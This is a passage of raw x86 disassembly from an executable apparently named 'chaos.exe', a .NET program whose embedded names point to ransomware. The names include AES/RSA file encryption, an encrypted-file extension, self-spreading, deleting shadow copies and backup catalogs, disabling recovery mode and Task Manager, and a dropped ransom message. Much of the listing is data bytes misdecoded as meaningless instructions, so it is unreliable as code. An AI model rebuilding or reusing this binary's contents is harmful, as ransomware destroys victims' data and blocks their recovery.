  4046d9:	02 81 01 e3 0b 77    	add    0x770be301(%ecx),%al
  4046df:	00 81 01 e9 0b 77    	add    %al,0x770be901(%ecx)
  4046e5:	00 41 01             	add    %al,0x1(%ecx)
  4046e8:	72 04                	jb     0x4046ee
  4046ea:	18 02                	sbb    %al,(%edx)
  4046ec:	a9 01 72 04 11       	test   $0x11047201,%eax
  4046f1:	02 b1 01 97 0b b2    	add    -0x4df468ff(%ecx),%dh
  4046f7:	00 b1 01 e3 0b 77    	add    %dh,0x770be301(%ecx)
  4046fd:	00 b1 01 e9 0b 77    	add    %dh,0x770be901(%ecx)
  404703:	00 b9 01 1e 0c 77    	add    %bh,0x770c1e01(%ecx)
  404709:	00 19                	add    %bl,(%ecx)
  40470b:	01 26                	add    %esp,(%esi)
  40470d:	0c 5f                	or     $0x5f,%al
  40470f:	00 19                	add    %bl,(%ecx)
  404711:	01 33                	add    %esi,(%ebx)
  404713:	0c 4a                	or     $0x4a,%al
  404715:	00 d9                	add    %bl,%cl
  404717:	00 3a                	add    %bh,(%edx)
  404719:	0c 32                	or     $0x32,%al
  40471b:	01 41 01             	add    %eax,0x1(%ecx)
  40471e:	72 04                	jb     0x404724
  404720:	56                   	push   %esi
  404721:	02 81 01 62 0c 64    	add    0x640c6201(%ecx),%al
  404727:	02 c9                	add    %cl,%cl
  404729:	01 72 04             	add    %esi,0x4(%edx)
  40472c:	77 00                	ja     0x40472e
  40472e:	d1 01                	roll   $1,(%ecx)
  404730:	fa                   	cli
  404731:	08 e9                	or     %ch,%cl
  404733:	01 d9                	add    %ebx,%ecx
  404735:	01 72 04             	add    %esi,0x4(%edx)
  404738:	ad                   	lods   %ds:(%esi),%eax
  404739:	00 e1                	add    %ah,%cl
  40473b:	01 c8                	add    %ecx,%eax
  40473d:	0c b2                	or     $0xb2,%al
  40473f:	00 d9                	add    %bl,%cl
  404741:	01 d6                	add    %edx,%esi
  404743:	0c 78                	or     $0x78,%al
  404745:	02 d9                	add    %cl,%bl
  404747:	01 de                	add    %ebx,%esi
  404749:	0c 80                	or     $0x80,%al
  40474b:	02 e9                	add    %cl,%ch
  40474d:	01 30                	add    %esi,(%eax)
  40474f:	0d 91 02 f1 01       	or     $0x1f10291,%eax
  404754:	72 04                	jb     0x40475a
  404756:	b2 00                	mov    $0x0,%dl
  404758:	09 01                	or     %eax,(%ecx)
  40475a:	48                   	dec    %eax
  40475b:	0d dc 00 f9 01       	or     $0x1f900dc,%eax
  404760:	5b                   	pop    %ebx
  404761:	0d b0 02 f9 01       	or     $0x1f902b0,%eax
  404766:	6d                   	insl   (%dx),%es:(%edi)
  404767:	0d dc 00 a9 00       	or     $0xa900dc,%eax
  40476c:	d3 09                	rorl   %cl,(%ecx)
  40476e:	71 00                	jno    0x404770
  404770:	19 01                	sbb    %eax,(%ecx)
  404772:	7e 0d                	jle    0x404781
  404774:	5f                   	pop    %edi
  404775:	00 01                	add    %al,(%ecx)
  404777:	02 72 04             	add    0x4(%edx),%dh
  40477a:	b2 00                	mov    $0x0,%dl
  40477c:	01 02                	add    %eax,(%edx)
  40477e:	94                   	xchg   %eax,%esp
  40477f:	0d b2 00 b1 00       	or     $0xb100b2,%eax
  404784:	72 04                	jb     0x40478a
  404786:	77 00                	ja     0x404788
  404788:	b1 00                	mov    $0x0,%cl
  40478a:	a9 0d b6 02 b1       	test   $0xb102b60d,%eax
  40478f:	00 3d 07 bd 02 01    	add    %bh,0x102bd07
  404795:	02 b7 0d 80 02 01    	add    0x102800d(%edi),%dh
  40479b:	02 cb                	add    %bl,%cl
  40479d:	0d b2 00 01 02       	or     $0x20100b2,%eax
  4047a2:	e7 0d                	out    %eax,$0xd
  4047a4:	d3 02                	roll   %cl,(%edx)
  4047a6:	b1 00                	mov    $0x0,%cl
  4047a8:	3d 07 da 02 11       	cmp    $0x1102da07,%eax
  4047ad:	02 1c 0e             	add    (%esi,%ecx,1),%bl
  4047b0:	07                   	pop    %es
  4047b1:	01 b1 00 30 0e dc    	add    %esi,-0x23f1d000(%ecx)
  4047b7:	00 a9 00 d3 09 f8    	add    %ch,-0x7f62d00(%ecx)
  4047bd:	02 a9 01 72 04 b2    	add    -0x4dfb8dff(%ecx),%ch
  4047c3:	00 b1 01 40 0e b2    	add    %dh,-0x4df1bfff(%ecx)
  4047c9:	00 a9 00 4a 0e 00    	add    %ch,0xe4a00(%ecx)
  4047cf:	03 b1 00 3d 07 10    	add    0x10073d00(%ecx),%esi
  4047d5:	03 19                	add    (%ecx),%ebx
  4047d7:	02 77 0e             	add    0xe(%edi),%dh
  4047da:	20 03                	and    %al,(%ebx)
  4047dc:	21 02                	and    %eax,(%edx)
  4047de:	83 0e 25             	orl    $0x25,(%esi)
  4047e1:	03 21                	add    (%ecx),%esp
  4047e3:	02 8e 0e 2d 03 01    	add    0x1032d0e(%esi),%cl
  4047e9:	02 72 04             	add    0x4(%edx),%dh
  4047ec:	77 00                	ja     0x4047ee
  4047ee:	01 02                	add    %eax,(%edx)
  4047f0:	97                   	xchg   %eax,%edi
  4047f1:	0e                   	push   %cs
  4047f2:	b2 00                	mov    $0x0,%dl
  4047f4:	01 02                	add    %eax,(%edx)
  4047f6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4047f7:	0e                   	push   %cs
  4047f8:	b2 00                	mov    $0x0,%dl
  4047fa:	b1 00                	mov    $0x0,%cl
  4047fc:	b2 0e                	mov    $0xe,%dl
  4047fe:	77 00                	ja     0x404800
  404800:	21 02                	and    %eax,(%edx)
  404802:	be 0e 4c 03 21       	mov    $0x21034c0e,%esi
  404807:	02 e9                	add    %cl,%ch
  404809:	0b 77 00             	or     0x0(%edi),%esi
  40480c:	99                   	cltd
  40480d:	00 cb                	add    %cl,%bl
  40480f:	0e                   	push   %cs
  404810:	54                   	push   %esp
  404811:	00 e1                	add    %ah,%cl
  404813:	00 d7                	add    %dl,%bh
  404815:	0e                   	push   %cs
  404816:	53                   	push   %ebx
  404817:	03 19                	add    (%ecx),%ebx
  404819:	01 e8                	add    %ebp,%eax
  40481b:	0e                   	push   %cs
  40481c:	59                   	pop    %ecx
  40481d:	03 81 00 fd 0e 54    	add    0x540efd00(%ecx),%eax
  404823:	00 19                	add    %bl,(%ecx)
  404825:	00 72 04             	add    %dh,0x4(%edx)
  404828:	b2 00                	mov    $0x0,%dl
  40482a:	14 00                	adc    $0x0,%al
  40482c:	72 04                	jb     0x404832
  40482e:	77 00                	ja     0x404830
  404830:	14 00                	adc    $0x0,%al
  404832:	0a 0f                	or     (%edi),%cl
  404834:	66 03 29             	add    (%ecx),%bp
  404837:	02 72 04             	add    0x4(%edx),%dh
  40483a:	ad                   	lods   %ds:(%esi),%eax
  40483b:	00 11                	add    %dl,(%ecx)
  40483d:	00 72 04             	add    %dh,0x4(%edx)
  404840:	77 00                	ja     0x404842
  404842:	31 02                	xor    %eax,(%edx)
  404844:	1d 0f 76 03 19       	sbb    $0x1903760f,%eax
  404849:	00 28                	add    %ch,(%eax)
  40484b:	0f 7a                	(bad)
  40484d:	03 41 02             	add    0x2(%ecx),%eax
  404850:	34 0f                	xor    $0xf,%al
  404852:	bd 02 31 00 40       	mov    $0x40003102,%ebp
  404857:	0f 07                	sysret
  404859:	01 a9 00 48 0f 48    	add    %ebp,0x480f4800(%ecx)
  40485f:	01 19                	add    %ebx,(%ecx)
  404861:	00 4a 0e             	add    %cl,0xe(%edx)
  404864:	81 03 11 00 d0 04    	addl   $0x4d00011,(%ebx)
  40486a:	94                   	xchg   %eax,%esp
  40486b:	00 11                	add    %dl,(%ecx)
  40486d:	00 e5                	add    %ah,%ch
  40486f:	04 9b                	add    $0x9b,%al
  404871:	00 39                	add    %bh,(%ecx)
  404873:	00 53 0f             	add    %dl,0xf(%ebx)
  404876:	07                   	pop    %es
  404877:	01 39                	add    %edi,(%ecx)
  404879:	00 5f 0f             	add    %bl,0xf(%edi)
  40487c:	ad                   	lods   %ds:(%esi),%eax
  40487d:	00 49 02             	add    %cl,0x2(%ecx)
  404880:	f6 04 54 00          	testb  $0x0,(%esp,%edx,2)
  404884:	a9 00 a2 0f 0e       	test   $0xe0fa200,%eax
  404889:	00 79 00             	add    %bh,0x0(%ecx)
  40488c:	b7 0f                	mov    $0xf,%bh
  40488e:	8c 03                	mov    %es,(%ebx)
  404890:	79 00                	jns    0x404892
  404892:	c9                   	leave
  404893:	0f 77                	emms
  404895:	00 49 02             	add    %cl,0x2(%ecx)
  404898:	fe 04 4a             	incb   (%edx,%ecx,2)
  40489b:	00 08                	add    %cl,(%eax)
  40489d:	00 84 00 7b 00 2e 00 	add    %al,0x2e007b(%eax,%eax,1)
  4048a4:	1b 00                	sbb    (%eax),%eax
  4048a6:	aa                   	stos   %al,%es:(%edi)
  4048a7:	03 2e                	add    (%esi),%ebp
  4048a9:	00 13                	add    %dl,(%ebx)
  4048ab:	00 a1 03 c3 00 2b    	add    %ah,0x2b00c303(%ecx)
  4048b1:	00 bb 00 e3 00 2b    	add    %bh,0x2b00e300(%ebx)
  4048b7:	00 bb 00 03 01 2b    	add    %bh,0x2b010300(%ebx)
  4048bd:	00 bb 00 23 01 2b    	add    %bh,0x2b012300(%ebx)
  4048c3:	00 bb 00 43 01 2b    	add    %bh,0x2b014300(%ebx)
  4048c9:	00 bb 00 e1 03 2b    	add    %bh,0x2b03e100(%ebx)
  4048cf:	00 bb 00 01 04 2b    	add    %bh,0x2b040100(%ebx)
  4048d5:	00 bb 00 20 04 2b    	add    %bh,0x2b042000(%ebx)
  4048db:	00 bb 00 40 04 2b    	add    %bh,0x2b044000(%ebx)
  4048e1:	00 bb 00 37 00 ab    	add    %bh,-0x54ffc900(%ebx)
  4048e7:	00 ec                	add    %ch,%ah
  4048e9:	00 0b                	add    %cl,(%ebx)
  4048eb:	01 2b                	add    %ebp,(%ebx)
  4048ed:	01 43 01             	add    %eax,0x1(%ebx)
  4048f0:	88 01                	mov    %al,(%ecx)
  4048f2:	9c                   	pushf
  4048f3:	01 ae 01 b8 01 23    	add    %ebp,0x2301b801(%esi)
  4048f9:	02 40 02             	add    0x2(%eax),%al
  4048fc:	69 02 6f 02 85 02    	imul   $0x285026f,(%edx),%eax
  404902:	98                   	cwtl
  404903:	02 c1                	add    %cl,%al
  404905:	02 e2                	add    %dl,%ah
  404907:	02 06                	add    (%esi),%al
  404909:	03 16                	add    (%esi),%edx
  40490b:	03 1a                	add    (%edx),%ebx
  40490d:	03 33                	add    (%ebx),%esi
  40490f:	03 39                	add    (%ecx),%edi
  404911:	03 44 03 6c          	add    0x6c(%ebx,%eax,1),%eax
  404915:	03 87 03 93 03 9a    	add    -0x65fc6cfd(%edi),%eax
  40491b:	03 05 00 01 00 00    	add    0x100,%eax
  404921:	00 d8                	add    %bl,%al
  404923:	04 a0                	add    $0xa0,%al
  404925:	00 02                	add    %al,(%edx)
  404927:	00 2b                	add    %ch,(%ebx)
  404929:	00 03                	add    %al,(%ebx)
  40492b:	00 8f 06 53 01 60    	add    %cl,0x60015306(%edi)
  404931:	03 06                	add    (%esi),%eax
  404933:	01 03                	add    %eax,(%ebx)
  404935:	00 8a 02 01 00 40    	add    %cl,0x40000102(%edx)
  40493b:	01 49 00             	add    %ecx,0x0(%ecx)
  40493e:	7c 04                	jl     0x404944
  404940:	01 00                	add    %eax,(%eax)
  404942:	40                   	inc    %eax
  404943:	01 4b 00             	add    %ecx,0x0(%ebx)
  404946:	97                   	xchg   %eax,%edi
  404947:	04 01                	add    $0x1,%al
  404949:	00 a8 25 00 00 25    	add    %ch,0x25000025(%eax)
  40494f:	00 20                	add    %ah,(%eax)
  404951:	27                   	daa
  404952:	00 00                	add    %al,(%eax)
  404954:	26 00 04 80          	add    %al,%es:(%eax,%eax,4)
	...
  404968:	76 06                	jbe    0x404970
  40496a:	00 00                	add    %al,(%eax)
  40496c:	04 00                	add    $0x0,%al
	...
  404976:	00 00                	add    %al,(%eax)
  404978:	01 00                	add    %eax,(%eax)
  40497a:	61                   	popa
  40497b:	00 00                	add    %al,(%eax)
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40498a:	00 00                	add    %al,(%eax)
  40498c:	01 00                	add    %eax,(%eax)
  40498e:	78 00                	js     0x404990
  404990:	00 00                	add    %al,(%eax)
  404992:	00 00                	add    %al,(%eax)
  404994:	04 00                	add    $0x0,%al
	...
  40499e:	00 00                	add    %al,(%eax)
  4049a0:	01 00                	add    %eax,(%eax)
  4049a2:	6a 00                	push   $0x0
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 00                	add    %al,(%eax)
  4049a8:	03 00                	add    (%eax),%eax
  4049aa:	02 00                	add    (%eax),%al
  4049ac:	05 00 04 00 06       	add    $0x6000400,%eax
  4049b1:	00 02                	add    %al,(%edx)
  4049b3:	00 08                	add    %cl,(%eax)
  4049b5:	00 02                	add    %al,(%edx)
  4049b7:	00 09                	add    %cl,(%ecx)
  4049b9:	00 05 00 0a 00 05    	add    %al,0x5000a00
  4049bf:	00 51 00             	add    %dl,0x0(%ecx)
  4049c2:	67 01 00             	add    %eax,(%bx,%si)
  4049c5:	00 00                	add    %al,(%eax)
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	3c 4d                	cmp    $0x4d,%al
  4049cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4049cc:	64 75 6c             	fs jne 0x404a3b
  4049cf:	65 3e 00 63 68       	gs add %ah,%ds:0x68(%ebx)
  4049d4:	61                   	popa
  4049d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4049d6:	73 2e                	jae    0x404a06
  4049d8:	65 78 65             	gs js  0x404a40
  4049db:	00 50 72             	add    %dl,0x72(%eax)
  4049de:	6f                   	outsl  %ds:(%esi),(%dx)
  4049df:	67 72 61             	addr16 jb 0x404a43
  4049e2:	6d                   	insl   (%dx),%es:(%edi)
  4049e3:	00 43 6f             	add    %al,0x6f(%ebx)
  4049e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4049e7:	73 6f                	jae    0x404a58
  4049e9:	6c                   	insb   (%dx),%es:(%edi)
  4049ea:	65 41                	gs inc %ecx
  4049ec:	70 70                	jo     0x404a5e
  4049ee:	6c                   	insb   (%dx),%es:(%edi)
  4049ef:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4049f6:	37                   	aaa
  4049f7:	00 4e 61             	add    %cl,0x61(%esi)
  4049fa:	74 69                	je     0x404a65
  4049fc:	76 65                	jbe    0x404a63
  4049fe:	4d                   	dec    %ebp
  4049ff:	65 74 68             	gs je  0x404a6a
  404a02:	6f                   	outsl  %ds:(%esi),(%dx)
  404a03:	64 73 00             	fs jae 0x404a06
  404a06:	64 72 69             	fs jb  0x404a72
  404a09:	76 65                	jbe    0x404a70
  404a0b:	4e                   	dec    %esi
  404a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404a0d:	74 69                	je     0x404a78
  404a0f:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  404a15:	6f                   	outsl  %ds:(%esi),(%dx)
  404a16:	6e                   	outsb  %ds:(%esi),(%dx)
  404a17:	00 4e 6f             	add    %cl,0x6f(%esi)
  404a1a:	74 69                	je     0x404a85
  404a1c:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  404a22:	6f                   	outsl  %ds:(%esi),(%dx)
  404a23:	6e                   	outsb  %ds:(%esi),(%dx)
  404a24:	46                   	inc    %esi
  404a25:	6f                   	outsl  %ds:(%esi),(%dx)
  404a26:	72 6d                	jb     0x404a95
  404a28:	00 6d 73             	add    %ch,0x73(%ebp)
  404a2b:	63 6f 72             	arpl   %ebp,0x72(%edi)
  404a2e:	6c                   	insb   (%dx),%es:(%edi)
  404a2f:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  404a36:	65 6d                	gs insl (%dx),%es:(%edi)
  404a38:	00 4f 62             	add    %cl,0x62(%edi)
  404a3b:	6a 65                	push   $0x65
  404a3d:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  404a41:	79 73                	jns    0x404ab6
  404a43:	74 65                	je     0x404aaa
  404a45:	6d                   	insl   (%dx),%es:(%edi)
  404a46:	2e 57                	cs push %edi
  404a48:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  404a4f:	46                   	inc    %esi
  404a50:	6f                   	outsl  %ds:(%esi),(%dx)
  404a51:	72 6d                	jb     0x404ac0
  404a53:	73 00                	jae    0x404a55
  404a55:	46                   	inc    %esi
  404a56:	6f                   	outsl  %ds:(%esi),(%dx)
  404a57:	72 6d                	jb     0x404ac6
  404a59:	00 5f 73             	add    %bl,0x73(%edi)
  404a5c:	61                   	popa
  404a5d:	6c                   	insb   (%dx),%es:(%edi)
  404a5e:	74 00                	je     0x404a60
  404a60:	75 73                	jne    0x404ad5
  404a62:	65 72 4e             	gs jb  0x404ab3
  404a65:	61                   	popa
  404a66:	6d                   	insl   (%dx),%es:(%edi)
  404a67:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  404a6b:	65 72 44             	gs jb  0x404ab2
  404a6e:	69 72 00 61 70 70 4d 	imul   $0x4d707061,0x0(%edx),%esi
  404a75:	75 74                	jne    0x404aeb
  404a77:	65 78 52             	gs js  0x404acc
  404a7a:	75 6e                	jne    0x404aea
  404a7c:	00 65 6e             	add    %ah,0x6e(%ebp)
  404a7f:	63 72 79             	arpl   %esi,0x79(%edx)
  404a82:	70 74                	jo     0x404af8
  404a84:	69 6f 6e 41 65 73 52 	imul   $0x52736541,0x6e(%edi),%ebp
  404a8b:	73 61                	jae    0x404aee
  404a8d:	00 65 6e             	add    %ah,0x6e(%ebp)
  404a90:	63 72 79             	arpl   %esi,0x79(%edx)
  404a93:	70 74                	jo     0x404b09
  404a95:	65 64 46             	gs fs inc %esi
  404a98:	69 6c 65 45 78 74 65 	imul   $0x6e657478,0x45(%ebp,%eiz,2),%ebp
  404a9f:	6e 
  404aa0:	73 69                	jae    0x404b0b
  404aa2:	6f                   	outsl  %ds:(%esi),(%dx)
  404aa3:	6e                   	outsb  %ds:(%esi),(%dx)
  404aa4:	00 63 68             	add    %ah,0x68(%ebx)
  404aa7:	65 63 6b 53          	arpl   %ebp,%gs:0x53(%ebx)
  404aab:	70 72                	jo     0x404b1f
  404aad:	65 61                	gs popa
  404aaf:	64 00 73 70          	add    %dh,%fs:0x70(%ebx)
  404ab3:	72 65                	jb     0x404b1a
  404ab5:	61                   	popa
  404ab6:	64 4e                	fs dec %esi
  404ab8:	61                   	popa
  404ab9:	6d                   	insl   (%dx),%es:(%edi)
  404aba:	65 00 63 68          	add    %ah,%gs:0x68(%ebx)
  404abe:	65 63 6b 43          	arpl   %ebp,%gs:0x43(%ebx)
  404ac2:	6f                   	outsl  %ds:(%esi),(%dx)
  404ac3:	70 79                	jo     0x404b3e
  404ac5:	52                   	push   %edx
  404ac6:	6f                   	outsl  %ds:(%esi),(%dx)
  404ac7:	61                   	popa
  404ac8:	6d                   	insl   (%dx),%es:(%edi)
  404ac9:	69 6e 67 00 70 72 6f 	imul   $0x6f727000,0x67(%esi),%ebp
  404ad0:	63 65 73             	arpl   %esp,0x73(%ebp)
  404ad3:	73 4e                	jae    0x404b23
  404ad5:	61                   	popa
  404ad6:	6d                   	insl   (%dx),%es:(%edi)
  404ad7:	65 00 61 70          	add    %ah,%gs:0x70(%ecx)
  404adb:	70 4d                	jo     0x404b2a
  404add:	75 74                	jne    0x404b53
  404adf:	65 78 52             	gs js  0x404b34
  404ae2:	75 6e                	jne    0x404b52
  404ae4:	32 00                	xor    (%eax),%al
  404ae6:	63 68 65             	arpl   %ebp,0x65(%eax)
  404ae9:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404aec:	74 61                	je     0x404b4f
  404aee:	72 74                	jb     0x404b64
  404af0:	75 70                	jne    0x404b62
  404af2:	46                   	inc    %esi
  404af3:	6f                   	outsl  %ds:(%esi),(%dx)
  404af4:	6c                   	insb   (%dx),%es:(%edi)
  404af5:	64 65 72 00          	fs gs jb 0x404af9
  404af9:	63 68 65             	arpl   %ebp,0x65(%eax)
  404afc:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404aff:	6c                   	insb   (%dx),%es:(%edi)
  404b00:	65 65 70 00          	gs gs jo 0x404b04
  404b04:	73 6c                	jae    0x404b72
  404b06:	65 65 70 54          	gs gs jo 0x404b5e
  404b0a:	65 78 74             	gs js  0x404b81
  404b0d:	62 6f 78             	bound  %ebp,0x78(%edi)
  404b10:	00 62 61             	add    %ah,0x61(%edx)
  404b13:	73 65                	jae    0x404b7a
  404b15:	36 34 49             	ss xor $0x49,%al
  404b18:	6d                   	insl   (%dx),%es:(%edi)
  404b19:	61                   	popa
  404b1a:	67 65 00 61 70       	add    %ah,%gs:0x70(%bx,%di)
  404b1f:	70 4d                	jo     0x404b6e
  404b21:	75 74                	jne    0x404b97
  404b23:	65 78 53             	gs js  0x404b79
  404b26:	74 61                	je     0x404b89
  404b28:	72 74                	jb     0x404b9e
  404b2a:	75 70                	jne    0x404b9c
  404b2c:	00 64 72 6f          	add    %ah,0x6f(%edx,%esi,2)
  404b30:	70 70                	jo     0x404ba2
  404b32:	65 64 4d             	gs fs dec %ebp
  404b35:	65 73 73             	gs jae 0x404bab
  404b38:	61                   	popa
  404b39:	67 65 54             	addr16 gs push %esp
  404b3c:	65 78 74             	gs js  0x404bb3
  404b3f:	62 6f 78             	bound  %ebp,0x78(%edi)
  404b42:	00 63 68             	add    %ah,0x68(%ebx)
  404b45:	65 63 6b 41          	arpl   %ebp,%gs:0x41(%ebx)
  404b49:	64 6d                	fs insl (%dx),%es:(%edi)
  404b4b:	69 6e 50 72 69 76 69 	imul   $0x69766972,0x50(%esi),%ebp
  404b52:	6c                   	insb   (%dx),%es:(%edi)
  404b53:	61                   	popa
  404b54:	67 65 00 63 68       	add    %ah,%gs:0x68(%bp,%di)
  404b59:	65 63 6b 64          	arpl   %ebp,%gs:0x64(%ebx)
  404b5d:	65 6c                	gs insb (%dx),%es:(%edi)
  404b5f:	65 74 65             	gs je  0x404bc7
  404b62:	53                   	push   %ebx
  404b63:	68 61 64 6f 77       	push   $0x776f6461
  404b68:	43                   	inc    %ebx
  404b69:	6f                   	outsl  %ds:(%esi),(%dx)
  404b6a:	70 69                	jo     0x404bd5
  404b6c:	65 73 00             	gs jae 0x404b6f
  404b6f:	63 68 65             	arpl   %ebp,0x65(%eax)
  404b72:	63 6b 64             	arpl   %ebp,0x64(%ebx)
  404b75:	69 73 61 62 6c 65 52 	imul   $0x52656c62,0x61(%ebx),%esi
  404b7c:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  404b80:	65 72 79             	gs jb  0x404bfc
  404b83:	4d                   	dec    %ebp
  404b84:	6f                   	outsl  %ds:(%esi),(%dx)
  404b85:	64 65 00 63 68       	fs add %ah,%gs:0x68(%ebx)
  404b8a:	65 63 6b 64          	arpl   %ebp,%gs:0x64(%ebx)
  404b8e:	65 6c                	gs insb (%dx),%es:(%edi)
  404b90:	65 74 65             	gs je  0x404bf8
  404b93:	42                   	inc    %edx
  404b94:	61                   	popa
  404b95:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  404b98:	70 43                	jo     0x404bdd
  404b9a:	61                   	popa
  404b9b:	74 61                	je     0x404bfe
  404b9d:	6c                   	insb   (%dx),%es:(%edi)
  404b9e:	6f                   	outsl  %ds:(%esi),(%dx)
  404b9f:	67 00 64 69          	add    %ah,0x69(%si)
  404ba3:	73 61                	jae    0x404c06
  404ba5:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  404ba9:	61                   	popa
  404baa:	73 6b                	jae    0x404c17
  404bac:	4d                   	dec    %ebp
  404bad:	61                   	popa
  404bae:	6e                   	outsb  %ds:(%esi),(%dx)
  404baf:	61                   	popa
  404bb0:	67 65 72 00          	addr16 gs jb 0x404bb4
  404bb4:	61                   	popa
  404bb5:	70 70                	jo     0x404c27
  404bb7:	4d                   	dec    %ebp
  404bb8:	75 74                	jne    0x404c2e
  404bba:	65 78 53             	gs js  0x404c10
  404bbd:	74 61                	je     0x404c20
  404bbf:	72 74                	jb     0x404c35
  404bc1:	75 70                	jne    0x404c33
  404bc3:	32 00                	xor    (%eax),%al
  404bc5:	61                   	popa
  404bc6:	70 70                	jo     0x404c38
  404bc8:	4d                   	dec    %ebp
  404bc9:	75 74                	jne    0x404c3f
  404bcb:	65 78 32             	gs js  0x404c00
  404bce:	00 73 74             	add    %dh,0x74(%ebx)
  404bd1:	61                   	popa
  404bd2:	74 69                	je     0x404c3d
  404bd4:	63 53 70             	arpl   %edx,0x70(%ebx)
  404bd7:	6c                   	insb   (%dx),%es:(%edi)
  404bd8:	69 74 00 61 70 70 4d 	imul   $0x754d7070,0x61(%eax,%eax,1),%esi
  404bdf:	75 
  404be0:	74 65                	je     0x404c47
  404be2:	78 00                	js     0x404be4
  404be4:	53                   	push   %ebx
  404be5:	79 73                	jns    0x404c5a
  404be7:	74 65                	je     0x404c4e
  404be9:	6d                   	insl   (%dx),%es:(%edi)
  404bea:	2e 54                	cs push %esp
  404bec:	65 78 74             	gs js  0x404c63
  404bef:	2e 52                	cs push %edx
  404bf1:	65 67 75 6c          	gs addr16 jne 0x404c61
  404bf5:	61                   	popa
  404bf6:	72 45                	jb     0x404c3d
  404bf8:	78 70                	js     0x404c6a
  404bfa:	72 65                	jb     0x404c61
  404bfc:	73 73                	jae    0x404c71
  404bfe:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  404c05:	67 65 78 00          	addr16 gs js 0x404c09
  404c09:	61                   	popa
  404c0a:	70 70                	jo     0x404c7c
  404c0c:	4d                   	dec    %ebp
  404c0d:	75 74                	jne    0x404c83
  404c0f:	65 78 52             	gs js  0x404c64
  404c12:	65 67 65 78 00       	gs addr16 gs js 0x404c17
  404c17:	53                   	push   %ebx
  404c18:	79 73                	jns    0x404c8d
  404c1a:	74 65                	je     0x404c81
  404c1c:	6d                   	insl   (%dx),%es:(%edi)
  404c1d:	2e 43                	cs inc %ebx
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	6c                   	insb   (%dx),%es:(%edi)
  404c21:	6c                   	insb   (%dx),%es:(%edi)
  404c22:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  404c27:	6e                   	outsb  %ds:(%esi),(%dx)
  404c28:	73 2e                	jae    0x404c58
  404c2a:	47                   	inc    %edi
  404c2b:	65 6e                	outsb  %gs:(%esi),(%dx)
  404c2d:	65 72 69             	gs jb  0x404c99
  404c30:	63 00                	arpl   %eax,(%eax)
  404c32:	4c                   	dec    %esp
  404c33:	69 73 74 60 31 00 6d 	imul   $0x6d003160,0x74(%ebx),%esi
  404c3a:	65 73 73             	gs jae 0x404cb0
  404c3d:	61                   	popa
  404c3e:	67 65 73 00          	addr16 gs jae 0x404c42
  404c42:	76 61                	jbe    0x404ca5
  404c44:	6c                   	insb   (%dx),%es:(%edi)
  404c45:	69 64 45 78 74 65 6e 	imul   $0x736e6574,0x78(%ebp,%eax,2),%esp
  404c4c:	73 
  404c4d:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
  404c54:	73 74                	jae    0x404cca
  404c56:	65 6d                	gs insl (%dx),%es:(%edi)
  404c58:	50                   	push   %eax
  404c59:	61                   	popa
  404c5a:	72 61                	jb     0x404cbd
  404c5c:	6d                   	insl   (%dx),%es:(%edi)
  404c5d:	65 74 65             	gs je  0x404cc5
  404c60:	72 73                	jb     0x404cd5
  404c62:	49                   	dec    %ecx
  404c63:	6e                   	outsb  %ds:(%esi),(%dx)
  404c64:	66 6f                	outsw  %ds:(%esi),(%dx)
  404c66:	00 4d 61             	add    %cl,0x61(%ebp)
  404c69:	69 6e 00 52 75 6e 00 	imul   $0x6e7552,0x0(%esi),%ebp
  404c70:	73 6c                	jae    0x404cde
  404c72:	65 65 70 4f          	gs gs jo 0x404cc5
  404c76:	75 74                	jne    0x404cec
  404c78:	4f                   	dec    %edi
  404c79:	66 54                	push   %sp
  404c7b:	65 6d                	gs insl (%dx),%es:(%edi)
  404c7d:	70 46                	jo     0x404cc5
  404c7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c80:	6c                   	insb   (%dx),%es:(%edi)
  404c81:	64 65 72 00          	fs gs jb 0x404c85
  404c85:	41                   	inc    %ecx
  404c86:	6c                   	insb   (%dx),%es:(%edi)
  404c87:	72 65                	jb     0x404cee
  404c89:	61                   	popa
  404c8a:	64 79 52             	fs jns 0x404cdf
  404c8d:	75 6e                	jne    0x404cfd
  404c8f:	6e                   	outsb  %ds:(%esi),(%dx)
  404c90:	69 6e 67 00 52 61 6e 	imul   $0x6e615200,0x67(%esi),%ebp
  404c97:	64 6f                	outsl  %fs:(%esi),(%dx)
  404c99:	6d                   	insl   (%dx),%es:(%edi)
  404c9a:	00 72 61             	add    %dh,0x61(%edx)
  404c9d:	6e                   	outsb  %ds:(%esi),(%dx)
  404c9e:	64 6f                	outsl  %fs:(%esi),(%dx)
  404ca0:	6d                   	insl   (%dx),%es:(%edi)
  404ca1:	00 52 61             	add    %dl,0x61(%edx)
  404ca4:	6e                   	outsb  %ds:(%esi),(%dx)
  404ca5:	64 6f                	outsl  %fs:(%esi),(%dx)
  404ca7:	6d                   	insl   (%dx),%es:(%edi)
  404ca8:	53                   	push   %ebx
  404ca9:	74 72                	je     0x404d1d
  404cab:	69 6e 67 00 52 61 6e 	imul   $0x6e615200,0x67(%esi),%ebp
  404cb2:	64 6f                	outsl  %fs:(%esi),(%dx)
